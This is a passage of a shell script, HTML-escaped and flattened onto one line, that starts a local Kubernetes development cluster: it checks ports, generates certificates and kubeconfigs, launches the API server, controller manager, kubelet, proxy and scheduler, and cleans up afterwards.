is free, proceeding...\" else echo \"ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_PORT\" exit 1 fi fi curl --silent -k -g $API_HOST:$API_SECURE_PORT if [ ! $? -eq 0 ]; then echo \"API SERVER secure port is free, proceeding...\" else echo \"ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_SECURE_PORT\" exit 1 fi&#125;function detect_binary &#123; # Detect the OS name/arch so that we can find our binary case \"$(uname -s)\" in Darwin) host_os=darwin ;; Linux) host_os=linux ;; *) echo \"Unsupported host OS. Must be Linux or Mac OS X.\" &gt;&amp;2 exit 1 ;; esac case \"$(uname -m)\" in x86_64*) host_arch=amd64 ;; i?86_64*) host_arch=amd64 ;; amd64*) host_arch=amd64 ;; aarch64*) host_arch=arm64 ;; arm64*) host_arch=arm64 ;; arm*) host_arch=arm ;; i?86*) host_arch=x86 ;; s390x*) host_arch=s390x ;; ppc64le*) host_arch=ppc64le ;; *) echo \"Unsupported host arch. Must be x86_64, 386, arm, arm64, s390x or ppc64le.\" &gt;&amp;2 exit 1 ;; esac GO_OUT=\"$&#123;KUBE_ROOT&#125;/_output/local/bin/$&#123;host_os&#125;/$&#123;host_arch&#125;\"&#125;cleanup_dockerized_kubelet()&#123; if [[ -e $KUBELET_CIDFILE ]]; then docker kill $(&lt;$KUBELET_CIDFILE) &gt; /dev/null rm -f $KUBELET_CIDFILE fi&#125;cleanup()&#123; echo \"Cleaning up...\" # delete running images # if [[ \"$&#123;ENABLE_CLUSTER_DNS&#125;\" == true ]]; then # Still need to figure why this commands throw an error: Error from server: client: etcd cluster is unavailable or misconfigured # $&#123;KUBECTL&#125; --namespace=kube-system delete service kube-dns # And this one hang forever: # $&#123;KUBECTL&#125; --namespace=kube-system delete rc kube-dns-v10 # fi # Check if the API server is still running [[ -n \"$&#123;APISERVER_PID-&#125;\" ]] &amp;&amp; APISERVER_PIDS=$(pgrep -P $&#123;APISERVER_PID&#125; ; ps -o pid= -p $&#123;APISERVER_PID&#125;) [[ -n \"$&#123;APISERVER_PIDS-&#125;\" ]] &amp;&amp; sudo kill $&#123;APISERVER_PIDS&#125; # Check if the controller-manager is still running [[ -n \"$&#123;CTLRMGR_PID-&#125;\" ]] &amp;&amp; CTLRMGR_PIDS=$(pgrep -P $&#123;CTLRMGR_PID&#125; ; ps -o pid= -p $&#123;CTLRMGR_PID&#125;) [[ -n \"$&#123;CTLRMGR_PIDS-&#125;\" ]] &amp;&amp; sudo kill $&#123;CTLRMGR_PIDS&#125; if [[ -n \"$DOCKERIZE_KUBELET\" ]]; then cleanup_dockerized_kubelet else # Check if the kubelet is still running [[ -n \"$&#123;KUBELET_PID-&#125;\" ]] &amp;&amp; KUBELET_PIDS=$(pgrep -P $&#123;KUBELET_PID&#125; ; ps -o pid= -p $&#123;KUBELET_PID&#125;) [[ -n \"$&#123;KUBELET_PIDS-&#125;\" ]] &amp;&amp; sudo kill $&#123;KUBELET_PIDS&#125; fi # Check if the proxy is still running [[ -n \"$&#123;PROXY_PID-&#125;\" ]] &amp;&amp; PROXY_PIDS=$(pgrep -P $&#123;PROXY_PID&#125; ; ps -o pid= -p $&#123;PROXY_PID&#125;) [[ -n \"$&#123;PROXY_PIDS-&#125;\" ]] &amp;&amp; sudo kill $&#123;PROXY_PIDS&#125; # Check if the scheduler is still running [[ -n \"$&#123;SCHEDULER_PID-&#125;\" ]] &amp;&amp; SCHEDULER_PIDS=$(pgrep -P $&#123;SCHEDULER_PID&#125; ; ps -o pid= -p $&#123;SCHEDULER_PID&#125;) [[ -n \"$&#123;SCHEDULER_PIDS-&#125;\" ]] &amp;&amp; sudo kill $&#123;SCHEDULER_PIDS&#125; # Check if the etcd is still running [[ -n \"$&#123;ETCD_PID-&#125;\" ]] &amp;&amp; kube::etcd::stop [[ -n \"$&#123;ETCD_DIR-&#125;\" ]] &amp;&amp; kube::etcd::clean_etcd_dir exit 0&#125;function warning &#123; message=$1 echo $(tput bold)$(tput setaf 1) echo \"WARNING: $&#123;message&#125;\" echo $(tput sgr0)&#125;function start_etcd &#123; echo \"Starting etcd\" kube::etcd::start&#125;function set_service_accounts &#123; SERVICE_ACCOUNT_LOOKUP=$&#123;SERVICE_ACCOUNT_LOOKUP:-true&#125; SERVICE_ACCOUNT_KEY=$&#123;SERVICE_ACCOUNT_KEY:-/tmp/kube-serviceaccount.key&#125; # Generate ServiceAccount key if needed if [[ ! -f \"$&#123;SERVICE_ACCOUNT_KEY&#125;\" ]]; then mkdir -p \"$(dirname $&#123;SERVICE_ACCOUNT_KEY&#125;)\" openssl genrsa -out \"$&#123;SERVICE_ACCOUNT_KEY&#125;\" 2048 2&gt;/dev/null fi&#125;function start_apiserver &#123; security_admission=\"\" if [[ -n \"$&#123;DENY_SECURITY_CONTEXT_ADMISSION&#125;\" ]]; then security_admission=\",SecurityContextDeny\" fi if [[ -n \"$&#123;PSP_ADMISSION&#125;\" ]]; then security_admission=\",PodSecurityPolicy\" fi if [[ -n \"$&#123;NODE_ADMISSION&#125;\" ]]; then security_admission=\",NodeRestriction\" fi if [ \"$&#123;ENABLE_POD_PRIORITY_PREEMPTION&#125;\" == true ]; then security_admission=\",Priority\" if [[ -n \"$&#123;RUNTIME_CONFIG&#125;\" ]]; then RUNTIME_CONFIG+=\",\" fi RUNTIME_CONFIG+=\"scheduling.k8s.io/v1alpha1=true\" fi # Admission Controllers to invoke prior to persisting objects in cluster # # The order defined here dose not matter. ENABLE_ADMISSION_PLUGINS=LimitRanger,ServiceAccount$&#123;security_admission&#125;,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection audit_arg=\"\" APISERVER_BASIC_AUDIT_LOG=\"\" if [[ \"$&#123;ENABLE_APISERVER_BASIC_AUDIT:-&#125;\" = true ]]; then # We currently only support enabling with a fixed path and with built-in log # rotation \"disabled\" (large value) so it behaves like kube-apiserver.log. # External log rotation should be set up the same as for kube-apiserver.log. APISERVER_BASIC_AUDIT_LOG=/tmp/kube-apiserver-audit.log audit_arg=\" --audit-log-path=$&#123;APISERVER_BASIC_AUDIT_LOG&#125;\" audit_arg+=\" --audit-log-maxage=0\" audit_arg+=\" --audit-log-maxbackup=0\" # Lumberjack doesn't offer any way to disable size-based rotation. It also # has an in-memory counter that doesn't notice if you truncate the file. # 2000000000 (in MiB) is a large number that fits in 31 bits. If the log # grows at 10MiB/s (~30K QPS), it will rotate after ~6 years if apiserver # never restarts. Please manually restart apiserver before this time. audit_arg+=\" --audit-log-maxsize=2000000000\" fi swagger_arg=\"\" if [[ \"$&#123;ENABLE_SWAGGER_UI&#125;\" = true ]]; then swagger_arg=\"--enable-swagger-ui=true \" fi authorizer_arg=\"\" if [[ -n \"$&#123;AUTHORIZATION_MODE&#125;\" ]]; then authorizer_arg=\"--authorization-mode=$&#123;AUTHORIZATION_MODE&#125; \" fi priv_arg=\"\" if [[ -n \"$&#123;ALLOW_PRIVILEGED&#125;\" ]]; then priv_arg=\"--allow-privileged \" fi if [[ $&#123;ENABLE_ADMISSION_PLUGINS&#125; == *\"Initializers\"* ]]; then if [[ -n \"$&#123;RUNTIME_CONFIG&#125;\" ]]; then RUNTIME_CONFIG+=\",\" fi RUNTIME_CONFIG+=\"admissionregistration.k8s.io/v1alpha1\" fi if [[ $&#123;ENABLE_ADMISSION_PLUGINS&#125; == *\"PodPreset\"* ]]; then if [[ -n \"$&#123;RUNTIME_CONFIG&#125;\" ]]; then RUNTIME_CONFIG+=\",\" fi RUNTIME_CONFIG+=\"settings.k8s.io/v1alpha1\" fi runtime_config=\"\" if [[ -n \"$&#123;RUNTIME_CONFIG&#125;\" ]]; then runtime_config=\"--runtime-config=$&#123;RUNTIME_CONFIG&#125;\" fi # Let the API server pick a default address when API_HOST_IP # is set to 127.0.0.1 advertise_address=\"\" if [[ \"$&#123;API_HOST_IP&#125;\" != \"127.0.0.1\" ]]; then advertise_address=\"--advertise-address=$&#123;API_HOST_IP&#125;\" fi if [[ \"$&#123;ADVERTISE_ADDRESS&#125;\" != \"\" ]] ; then advertise_address=\"--advertise-address=$&#123;ADVERTISE_ADDRESS&#125;\" fi # Create CA signers if [[ \"$&#123;ENABLE_SINGLE_CA_SIGNER:-&#125;\" = true ]]; then kube::util::create_signing_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" server '\"client auth\",\"server auth\"' sudo cp \"$&#123;CERT_DIR&#125;/server-ca.key\" \"$&#123;CERT_DIR&#125;/client-ca.key\" sudo cp \"$&#123;CERT_DIR&#125;/server-ca.crt\" \"$&#123;CERT_DIR&#125;/client-ca.crt\" sudo cp \"$&#123;CERT_DIR&#125;/server-ca-config.json\" \"$&#123;CERT_DIR&#125;/client-ca-config.json\" else kube::util::create_signing_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" server '\"server auth\"' kube::util::create_signing_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" client '\"client auth\"' fi # Create auth proxy client ca kube::util::create_signing_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" request-header '\"client auth\"' # serving cert for kube-apiserver kube::util::create_serving_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"server-ca\" kube-apiserver kubernetes.default kubernetes.default.svc \"localhost\" $&#123;API_HOST_IP&#125; $&#123;API_HOST&#125; $&#123;FIRST_SERVICE_CLUSTER_IP&#125; # Create client certs signed with client-ca, given id, given CN and a number of groups kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" 'client-ca' kubelet system:node:$&#123;HOSTNAME_OVERRIDE&#125; system:nodes kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" 'client-ca' kube-proxy system:kube-proxy system:nodes kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" 'client-ca' controller system:kube-controller-manager kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" 'client-ca' scheduler system:kube-scheduler kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" 'client-ca' admin system:admin system:masters # Create matching certificates for kube-aggregator kube::util::create_serving_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"server-ca\" kube-aggregator api.kube-public.svc \"localhost\" $&#123;API_HOST_IP&#125; kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" request-header-ca auth-proxy system:auth-proxy # TODO remove masters and add rolebinding kube::util::create_client_certkey \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" 'client-ca' kube-aggregator system:kube-aggregator system:masters kube::util::write_client_kubeconfig \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"$&#123;ROOT_CA_FILE&#125;\" \"$&#123;API_HOST&#125;\" \"$&#123;API_SECURE_PORT&#125;\" kube-aggregator cloud_config_arg=\"--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;\" if [[ \"$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;\" == \"true\" ]]; then cloud_config_arg=\"--cloud-provider=external\" fi APISERVER_LOG=$&#123;LOG_DIR&#125;/kube-apiserver.log #$&#123;CONTROLPLANE_SUDO&#125; \"$&#123;GO_OUT&#125;/hyperkube\" apiserver $&#123;swagger_arg&#125; $&#123;audit_arg&#125; $&#123;authorizer_arg&#125; $&#123;priv_arg&#125; $&#123;runtime_config&#125; \\ $&#123;CONTROLPLANE_SUDO&#125; \"$&#123;GO_OUT&#125;/kube-apiserver\" $&#123;swagger_arg&#125; $&#123;audit_arg&#125; $&#123;authorizer_arg&#125; $&#123;priv_arg&#125; $&#123;runtime_config&#125; \\ $&#123;cloud_config_arg&#125; \\ $&#123;advertise_address&#125; \\ --v=$&#123;LOG_LEVEL&#125; \\ --vmodule=\"$&#123;LOG_SPEC&#125;\" \\ --cert-dir=\"$&#123;CERT_DIR&#125;\" \\ --client-ca-file=\"$&#123;CERT_DIR&#125;/client-ca.crt\" \\ --service-account-key-file=\"$&#123;SERVICE_ACCOUNT_KEY&#125;\" \\ --service-account-lookup=\"$&#123;SERVICE_ACCOUNT_LOOKUP&#125;\" \\ --enable-admission-plugins=\"$&#123;ENABLE_ADMISSION_PLUGINS&#125;\" \\ --disable-admission-plugins=\"$&#123;DISABLE_ADMISSION_PLUGINS&#125;\" \\ --admission-control-config-file=\"$&#123;ADMISSION_CONTROL_CONFIG_FILE&#125;\" \\ --bind-address=\"$&#123;API_BIND_ADDR&#125;\" \\ --secure-port=\"$&#123;API_SECURE_PORT&#125;\" \\ --tls-cert-file=\"$&#123;CERT_DIR&#125;/serving-kube-apiserver.crt\" \\ --tls-private-key-file=\"$&#123;CERT_DIR&#125;/serving-kube-apiserver.key\" \\ --insecure-bind-address=\"$&#123;API_HOST_IP&#125;\" \\ --insecure-port=\"$&#123;API_PORT&#125;\" \\ --storage-backend=$&#123;STORAGE_BACKEND&#125; \\ --etcd-servers=\"http://$&#123;ETCD_HOST&#125;:$&#123;ETCD_PORT&#125;\" \\ --service-cluster-ip-range=\"$&#123;SERVICE_CLUSTER_IP_RANGE&#125;\" \\ --feature-gates=\"$&#123;FEATURE_GATES&#125;\" \\ --external-hostname=\"$&#123;EXTERNAL_HOSTNAME&#125;\" \\ --requestheader-username-headers=X-Remote-User \\ --requestheader-group-headers=X-Remote-Group \\ --requestheader-extra-headers-prefix=X-Remote-Extra- \\ --requestheader-client-ca-file=\"$&#123;CERT_DIR&#125;/request-header-ca.crt\" \\ --requestheader-allowed-names=system:auth-proxy \\ --proxy-client-cert-file=\"$&#123;CERT_DIR&#125;/client-auth-proxy.crt\" \\ --proxy-client-key-file=\"$&#123;CERT_DIR&#125;/client-auth-proxy.key\" \\ --cors-allowed-origins=\"$&#123;API_CORS_ALLOWED_ORIGINS&#125;\" &gt;\"$&#123;APISERVER_LOG&#125;\" 2&gt;&amp;1 &amp; APISERVER_PID=$! # Wait for kube-apiserver to come up before launching the rest of the components. echo \"Waiting for apiserver to come up\" # this uses the API port because if you don't have any authenticator, you can't seem to use the secure port at all. # this matches what happened with the combination in 1.4. # TODO change this conditionally based on whether API_PORT is on or off kube::util::wait_for_url \"https://$&#123;API_HOST_IP&#125;:$&#123;API_SECURE_PORT&#125;/healthz\" \"apiserver: \" 1 $&#123;WAIT_FOR_URL_API_SERVER&#125; \\ || &#123; echo \"check apiserver logs: $&#123;APISERVER_LOG&#125;\" ; exit 1 ; &#125; # Create kubeconfigs for all components, using client certs kube::util::write_client_kubeconfig \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"$&#123;ROOT_CA_FILE&#125;\" \"$&#123;API_HOST&#125;\" \"$&#123;API_SECURE_PORT&#125;\" admin $&#123;CONTROLPLANE_SUDO&#125; chown \"$&#123;USER&#125;\" \"$&#123;CERT_DIR&#125;/client-admin.key\" # make readable for kubectl kube::util::write_client_kubeconfig \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"$&#123;ROOT_CA_FILE&#125;\" \"$&#123;API_HOST&#125;\" \"$&#123;API_SECURE_PORT&#125;\" kubelet kube::util::write_client_kubeconfig \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"$&#123;ROOT_CA_FILE&#125;\" \"$&#123;API_HOST&#125;\" \"$&#123;API_SECURE_PORT&#125;\" kube-proxy kube::util::write_client_kubeconfig \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"$&#123;ROOT_CA_FILE&#125;\" \"$&#123;API_HOST&#125;\" \"$&#123;API_SECURE_PORT&#125;\" controller kube::util::write_client_kubeconfig \"$&#123;CONTROLPLANE_SUDO&#125;\" \"$&#123;CERT_DIR&#125;\" \"$&#123;ROOT_CA_FILE&#125;\" \"$&#123;API_HOST&#125;\" \"$&#123;API_SECURE_PORT&#125;\" scheduler if [[ -z \"$&#123;AUTH_ARGS&#125;\" ]]; then AUTH_ARGS=\"--client-key=$&#123;CERT_DIR&#125;/client-admin.key --client-certificate=$&#123;CERT_DIR&#125;/client-admin.crt\" fi $&#123;CONTROLPLANE_SUDO&#125; cp \"$&#123;CERT_DIR&#125;/admin.kubeconfig\" \"$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig\" $&#123;CONTROLPLANE_SUDO&#125; chown $(whoami) \"$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig\" $&#123;KUBECTL&#125; config set-cluster local-up-cluster --kubeconfig=\"$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig\" --server=\"https://$&#123;API_HOST_IP&#125;:31090\" echo \"use 'kubectl --kubeconfig=$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig' to use the aggregated API server\"&#125;function start_controller_manager &#123; node_cidr_args=\"\" if [[ \"$&#123;NET_PLUGIN&#125;\" == \"kubenet\" ]]; then node_cidr_args=\"--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 \" fi cloud_config_arg=\"--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;\" if [[ \"$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;\" == \"true\" ]]; then cloud_config_arg=\"--cloud-provider=external\" cloud_config_arg+=\" --external-cloud-volume-plugin=$&#123;CLOUD_PROVIDER&#125;\" cloud_config_arg+=\" --cloud-config=$&#123;CLOUD_CONFIG&#125;\" fi CTLRMGR_LOG=$&#123;LOG_DIR&#125;/kube-controller-manager.log #$&#123;CONTROLPLANE_SUDO&#125; \"$&#123;GO_OUT&#125;/hyperkube\" controller-manager \\ $&#123;CONTROLPLANE_SUDO&#125; \"$&#123;GO_OUT&#125;/kube-controller-manager\" \\ --v=$&#123;LOG_LEVEL&#125; \\ --vmodule=\"$&#123;LOG_SPEC&#125;\" \\ --service-account-private-key-file=\"$&#123;SERVICE_ACCOUNT_KEY&#125;\" \\ --root-ca-file=\"$&#123;ROOT_CA_FILE&#125;\" \\ --cluster-signing-cert-file=\"$&#123;CLUSTER_SIGNING_CERT_FILE&#125;\" \\ --cluster-signing-key-file=\"$&#123;CLUSTER_SIGNING_KEY_FILE&#125;\" \\ --enable-hostpath-provisioner=\"$&#123;ENABLE_HOSTPATH_PROVISIONER&#125;\" \\ $&#123;node_cidr_args&#125; \\ --pvclaimbinder-sync-period=\"$&#123;CLAIM_BINDER_SYNC_PERIOD&#125;\" \\ --feature-gates=\"$&#123;FEATURE_GATES&#125;\" \\ $&#123;cloud_config_arg&#125; \\ --kubeconfig \"$CERT_DIR\"/controller.kubeconfig \\ --use-service-account-credentials \\ --controllers=\"$&#123;KUBE_CONTROLLERS&#125;\" \\ --master=\"https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;\" &gt;\"$&#123;CTLRMGR_LOG&#125;\" 2&gt;&amp;1 &amp; CTLRMGR_PID=$!&#125;function start_cloud_controller_manager &#123; if [ -z \"$&#123;CLOUD_CONFIG&#125;\" ]; then echo \"CLOUD_CONFIG cannot be empty!\" exit 1 fi if [ ! -f \"$&#123;CLOUD_CONFIG&#125;\" ]; then echo \"Cloud config $&#123;CLOUD_CONFIG&#125; doesn't exist\" exit 1 fi node_cidr_args=\"\" if [[ \"$&#123;NET_PLUGIN&#125;\" == \"kubenet\" ]]; then node_cidr_args=\"--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 \" fi CLOUD_CTLRMGR_LOG=$&#123;LOG_DIR&#125;/cloud-controller-manager.log #$&#123;CONTROLPLANE_SUDO&#125; $&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-\"$&#123;GO_OUT&#125;/hyperkube\" cloud-controller-manager&#125; \\ $&#123;CONTROLPLANE_SUDO&#125; $&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-\"$&#123;GO_OUT&#125;/cloud-controller-manager\"&#125; \\ --v=$&#123;LOG_LEVEL&#125; \\ --vmodule=\"$&#123;LOG_SPEC&#125;\" \\ $&#123;node_cidr_args&#125; \\ --feature-gates=\"$&#123;FEATURE_GATES&#125;\" \\ --cloud-provider=$&#123;CLOUD_PROVIDER&#125; \\ --cloud-config=$&#123;CLOUD_CONFIG&#125; \\ --kubeconfig \"$CERT_DIR\"/controller.kubeconfig \\ --use-service-account-credentials \\ --master=\"https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;\" &gt;\"$&#123;CLOUD_CTLRMGR_LOG&#125;\" 2&gt;&amp;1 &amp; CLOUD_CTLRMGR_PID=$!&#125;function start_kubelet &#123; KUBELET_LOG=$&#123;LOG_DIR&#125;/kubelet.log mkdir -p \"$&#123;POD_MANIFEST_PATH&#125;\" &amp;&gt;/dev/null || sudo mkdir -p \"$&#123;POD_MANIFEST_PATH&#125;\" priv_arg=\"\" if [[ -n \"$&#123;ALLOW_PRIVILEGED&#125;\" ]]; then priv_arg=\"--allow-privileged \" fi cloud_config_arg=\"--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;\" if [[ \"$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;\" == \"true\" ]]; then cloud_config_arg=\"--cloud-provider=external\" cloud_config_arg+=\" --provider-id=$(hostname)\" fi mkdir -p \"/var/lib/kubelet\" &amp;&gt;/dev/null || sudo mkdir -p \"/var/lib/kubelet\" if [[ -z \"$&#123;DOCKERIZE_KUBELET&#125;\" ]]; then # Enable dns if [[ \"$&#123;ENABLE_CLUSTER_DNS&#125;\" = true ]]; then dns_args=\"--cluster-dns=$&#123;DNS_SERVER_IP&#125; --cluster-domain=$&#123;DNS_DOMAIN&#125;\" else # To start a private DNS server set ENABLE_CLUSTER_DNS and # DNS_SERVER_IP/DOMAIN. This will at least provide a working # DNS server for real world hostnames. dns_args=\"--cluster-dns=8.8.8.8\" fi net_plugin_args=\"\" if [[ -n \"$&#123;NET_PLUGIN&#125;\" ]]; then net_plugin_args=\"--network-plugin=$&#123;NET_PLUGIN&#125;\" fi auth_args=\"\" if [[ -n \"$&#123;KUBELET_AUTHORIZATION_WEBHOOK:-&#125;\" ]]; then auth_args=\"$&#123;auth_args&#125; --authorization-mode=Webhook\" fi if [[ -n \"$&#123;KUBELET_AUTHENTICATION_WEBHOOK:-&#125;\" ]]; then auth_args=\"$&#123;auth_args&#125; --authentication-token-webhook\" fi if [[ -n \"$&#123;CLIENT_CA_FILE:-&#125;\" ]]; then auth_args=\"$&#123;auth_args&#125; --client-ca-file=$&#123;CLIENT_CA_FILE&#125;\" fi cni_conf_dir_args=\"\" if [[ -n \"$&#123;CNI_CONF_DIR&#125;\" ]]; then cni_conf_dir_args=\"--cni-conf-dir=$&#123;CNI_CONF_DIR&#125;\" fi cni_bin_dir_args=\"\" if [[ -n \"$&#123;CNI_BIN_DIR&#125;\" ]]; then cni_bin_dir_args=\"--cni-bin-dir=$&#123;CNI_BIN_DIR&#125;\" fi container_runtime_endpoint_args=\"\" if [[ -n \"$&#123;CONTAINER_RUNTIME_ENDPOINT&#125;\" ]]; then container_runtime_endpoint_args=\"--container-runtime-endpoint=$&#123;CONTAINER_RUNTIME_ENDPOINT&#125;\" fi image_service_endpoint_args=\"\" if [[ -n \"$&#123;IMAGE_SERVICE_ENDPOINT&#125;\" ]]; then image_service_endpoint_args=\"--image-service-endpoint=$&#123;IMAGE_SERVICE_ENDPOINT&#125;\" fi #sudo -E \"$&#123;GO_OUT&#125;/hyperkube\" kubelet $&#123;priv_arg&#125;\\ sudo -E \"$&#123;GO_OUT&#125;/kubelet\" $&#123;priv_arg&#125;\\ --v=$&#123;LOG_LEVEL&#125; \\ --vmodule=\"$&#123;LOG_SPEC&#125;\" \\ --chaos-chance=\"$&#123;CHAOS_CHANCE&#125;\" \\ --container-runtime=\"$&#123;CONTAINER_RUNTIME&#125;\" \\ --fail-swap-on=false \\ #--rkt-path=\"$&#123;RKT_PATH&#125;\" \\ --rkt-stage1-image=\"$&#123;RKT_STAGE1_IMAGE&#125;\" \\ --hostname-override=\"$&#123;HOSTNAME_OVERRIDE&#125;\" \\ $&#123;cloud_config_arg&#125; \\ --address=\"$&#123;KUBELET_HOST&#125;\" \\ --kubeconfig \"$CERT_DIR\"/kubelet.kubeconfig \\ --feature-gates=\"$&#123;FEATURE_GATES&#125;\" \\ --cpu-cfs-quota=$&#123;CPU_CFS_QUOTA&#125; \\ --enable-controller-attach-detach=\"$&#123;ENABLE_CONTROLLER_ATTACH_DETACH&#125;\" \\ --cgroups-per-qos=$&#123;CGROUPS_PER_QOS&#125; \\ --cgroup-driver=$&#123;CGROUP_DRIVER&#125; \\ --keep-terminated-pod-volumes=$&#123;KEEP_TERMINATED_POD_VOLUMES&#125; \\ --eviction-hard=$&#123;EVICTION_HARD&#125; \\ --eviction-soft=$&#123;EVICTION_SOFT&#125; \\ --eviction-pressure-transition-period=$&#123;EVICTION_PRESSURE_TRANSITION_PERIOD&#125; \\ --pod-manifest-path=\"$&#123;POD_MANIFEST_PATH&#125;\" \\ --fail-swap-on=\"$&#123;FAIL_SWAP_ON&#125;\" \\ $&#123;auth_args&#125; \\ $&#123;dns_args&#125; \\ $&#123;cni_conf_dir_args&#125; \\ $&#123;cni_bin_dir_args&#125; \\ $&#123;net_plugin_args&#125; \\ $&#123;container_runtime_endpoint_args&#125; \\ $&#123;image_service_endpoint_args&#125; \\ --port=\"$KUBELET_PORT\" \\ $&#123;KUBELET_FLAGS&#125; &gt;\"$&#123;KUBELET_LOG&#125;\" 2&gt;&amp;1 &amp; KUBELET_PID=$! # Quick check that kubelet is running. if ps -p $KUBELET_PID &gt; /dev/null ; then echo \"kubelet ( $KUBELET_PID ) is running.\" else cat $&#123;KUBELET_LOG&#125; ; exit 1 fi else # Docker won't run a container with a cidfile (container id file) # unless that file does not already exist; clean up an existing # dockerized kubelet that might be running. cleanup_dockerized_kubelet cred_bind=\"\" # path to cloud credentials. cloud_cred=\"\" if [ \"$&#123;CLOUD_PROVIDER&#125;\" == \"aws\" ]; then cloud_cred=\"$&#123;HOME&#125;/.aws/credentials\" fi if [ \"$&#123;CLOUD_PROVIDER&#125;\" == \"gce\" ]; then cloud_cred=\"$&#123;HOME&#125;/.config/gcloud\" fi if [ \"$&#123;CLOUD_PROVIDER&#125;\" == \"openstack\" ]; then cloud_cred=\"$&#123;CLOUD_CONFIG&#125;\" fi if [[ -n \"$&#123;cloud_cred&#125;\" ]]; then cred_bind=\"--volume=$&#123;cloud_cred&#125;:$&#123;cloud_cred&#125;:ro\" fi docker run \\ --volume=/:/rootfs:ro \\ --volume=/var/run:/var/run:rw \\ --volume=/sys:/sys:ro \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --volume=/var/lib/kubelet/:/var/lib/kubelet:rw \\ --volume=/dev:/dev \\ --volume=/run/xtables.lock:/run/xtables.lock:rw \\ $&#123;cred_bind&#125; \\ --net=host \\ --privileged=true \\ -i \\ --cidfile=$KUBELET_CIDFILE \\ k8s.gcr.io/kubelet \\ /kubelet --v=$&#123;LOG_LEVEL&#125; --containerized $&#123;priv_arg&#125;--chaos-chance=\"$&#123;CHAOS_CHANCE&#125;\" --pod-manifest-path=\"$&#123;POD_MANIFEST_PATH&#125;\" --hostname-override=\"$&#123;HOSTNAME_OVERRIDE&#125;\" $&#123;cloud_config_arg&#125; \\ --address=\"127.0.0.1\" --kubeconfig \"$CERT_DIR\"/kubelet.kubeconfig --port=\"$KUBELET_PORT\" --enable-controller-attach-detach=\"$&#123;ENABLE_CONTROLLER_ATTACH_DETACH&#125;\" &amp;&gt; $KUBELET_LOG &amp; fi&#125;function start_kubeproxy &#123; PROXY_LOG=$&#123;LOG_DIR&#125;/kube-proxy.log cat &lt;&lt;EOF &gt; /tmp/kube-proxy.yamlapiVersion: kubeproxy.config.k8s.io/v1alpha1kind: KubeProxyConfigurationclientConnection: kubeconfig: $&#123;CERT_DIR&#125;/kube-proxy.kubeconfighostnameOverride: $&#123;HOSTNAME_OVERRIDE&#125;mode: $&#123;KUBE_PROXY_MODE&#125;EOF #sudo \"$&#123;GO_OUT&#125;/hyperkube\" proxy \\ sudo \"$&#123;GO_OUT&#125;/kube-proxy\" \\ --v=$&#123;LOG_LEVEL&#125; \\ --feature-gates=\"$&#123;FEATURE_GATES&#125;\" \\ --config=/tmp/kube-proxy.yaml \\ --master=\"https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;\" &gt;\"$&#123;PROXY_LOG&#125;\" 2&gt;&amp;1 &amp; PROXY_PID=$! SCHEDULER_LOG=$&#123;LOG_DIR&#125;/kube-scheduler.log #$&#123;CONTROLPLANE_SUDO&#125; \"$&#123;GO_OUT&#125;/hyperkube\" scheduler \\ $&#123;CONTROLPLANE_SUDO&#125; \"$&#123;GO_OUT&#125;/kube-scheduler\" \\ --v=$&#123;LOG_LEVEL&#125; \\ --kubeconfig \"$CERT_DIR\"/scheduler.kubeconfig \\ --feature-gates=\"$&#123;FEATURE_GATES&#125;\" \\ --master=\"https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;\" &gt;\"$&#123;SCHEDULER_LOG&#125;\" 2&gt;&amp;1 